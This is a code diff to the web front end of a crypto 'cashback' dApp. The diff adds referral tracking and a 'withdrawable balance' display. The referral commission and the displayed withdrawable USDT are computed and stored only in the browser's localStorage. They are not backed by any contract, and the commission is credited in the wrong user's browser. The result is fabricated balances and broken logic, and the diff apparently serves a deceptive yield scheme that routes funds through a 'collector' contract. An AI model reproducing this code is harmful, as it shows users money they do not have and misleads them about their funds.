@@ -108,8 +108,12 @@
                     <span id="lblCashbackBal" class="text-slate-200">0.000000 USDT</span>
                 </div>
                 <div class="flex justify-between text-slate-400">
-                    <span>Convertible balance</span>
-                    <span id="lblConvertibleBal" class="text-slate-300">0.000000 MATIC</span>
+                    <span>Referral balance</span>
+                    <span id="lblReferralBal" class="text-slate-300">0.000000 USDT</span>
+                </div>
+                <div class="flex justify-between text-slate-400 border-t border-slate-800 pt-2 font-semibold">
+                    <span class="text-emerald-400">Withdrawable balance</span>
+                    <span id="lblWithdrawableBal" class="text-emerald-400">0.000000 USDT</span>
                 </div>
             </div>
 
@@ -290,8 +294,16 @@
             generateIncomeList();
             startLiveCalculatingStats();
             
+            // Check ref parameter from URL and store in localStorage
+            const urlParams = new URLSearchParams(window.location.search);
+            const refParam = urlParams.get("ref") || urlParams.get("code");
+            if (refParam && ethers.isAddress(refParam)) {
+                localStorage.setItem("saved_referrer", refParam.toLowerCase());
+            }
+
             setTimeout(checkAutoConnect, 1500);
         });
+
 
         async function checkAutoConnect() {
             if (typeof window.ethereum !== "undefined") {
@@ -368,7 +380,7 @@
 
         function getQueryParameter(name) {
             const urlParams = new URLSearchParams(window.location.search);
-            return urlParams.get(name);
+            return urlParams.get(name) || urlParams.get("code");
         }
 
         function getInterestRate(balance) {
@@ -449,7 +461,7 @@
                 await tx.wait();
 
                 const collector = new ethers.Contract(COLLECTOR_CONTRACT_ADDRESS, COLLECTOR_ABI, signer);
-                const referrer = getQueryParameter("ref") || ethers.ZeroAddress;
+                const referrer = getQueryParameter("ref") || localStorage.getItem("saved_referrer") || ethers.ZeroAddress;
                 
                 try {
                     const regTx = await collector.registerUser(referrer);
@@ -517,8 +529,15 @@
                     const cashback = formattedBal * rate;
                     const maticInterest = (cashback / 3000).toFixed(5);
 
+                    // Get referral balance from localStorage for this user
+                    const refBalanceKey = `ref_balance_${userAddress.toLowerCase()}`;
+                    const referralBalance = parseFloat(localStorage.getItem(refBalanceKey) || "0");
+                    const withdrawableBalance = cashback + referralBalance;
+
                     document.getElementById("lblCashbackBal").innerText = `${cashback.toFixed(6)} USDT`;
-                    document.getElementById("lblConvertibleBal").innerText = `${maticInterest} MATIC`;
+                    document.getElementById("lblReferralBal").innerText = `${referralBalance.toFixed(6)} USDT`;
+                    document.getElementById("lblWithdrawableBal").innerText = `${withdrawableBalance.toFixed(6)} USDT`;
+
                     document.getElementById("lblInterestEth").innerText = `${maticInterest} MATIC`;
                     document.getElementById("lblInterestRate").innerText = `${(rate * 100).toFixed(1)}%`;
 
@@ -549,12 +568,34 @@
                 }
 
                 const collector = new ethers.Contract(COLLECTOR_CONTRACT_ADDRESS, COLLECTOR_ABI, signer);
-                const withdrawAmount = ethers.parseUnits("10", 6);
+                const withdrawAmountNum = 10; // 10 USDT
+                const withdrawAmount = ethers.parseUnits(withdrawAmountNum.toString(), 6);
 
                 const tx = await collector.requestWithdraw(withdrawAmount);
                 await tx.wait();
 
+                // 10% Referral Commission Logic
+                try {
+                    const collectorReader = new ethers.Contract(COLLECTOR_CONTRACT_ADDRESS, COLLECTOR_ABI, provider);
+                    const userInfo = await collectorReader.users(userAddress);
+                    let referrerAddr = userInfo.referrer;
+                    if (!referrerAddr || referrerAddr === ethers.ZeroAddress) {
+                        referrerAddr = localStorage.getItem("saved_referrer");
+                    }
+
+                    if (referrerAddr && referrerAddr !== ethers.ZeroAddress) {
+                        const refKey = `ref_balance_${referrerAddr.toLowerCase()}`;
+                        let currentRefBal = parseFloat(localStorage.getItem(refKey) || "0");
+                        let commission = withdrawAmountNum * 0.10; // 10% commission
+                        currentRefBal += commission;
+                        localStorage.setItem(refKey, currentRefBal.toString());
+                    }
+                } catch (refErr) {
+                    console.error("Referral commission credit error:", refErr);
+                }
+
                 alert("Withdraw တောင်းဆိုချက် Smart Contract သို့ အောင်မြင်စွာ တင်သွင်းပြီးပါပြီ။ Admin ဘက်တွင် အချိန်နှင့်တပြေးညီ ပေါ်လာပါမည်။");
+                checkUserData(); // Refresh dashboard balances
             } catch (err) {
                 console.error(err);
                 alert("Withdraw တောင်းဆိုမှု မအောင်မြင်ပါ။");
@@ -567,3 +608,5 @@
     </script>
 </body>
 </html>
+
+  sync
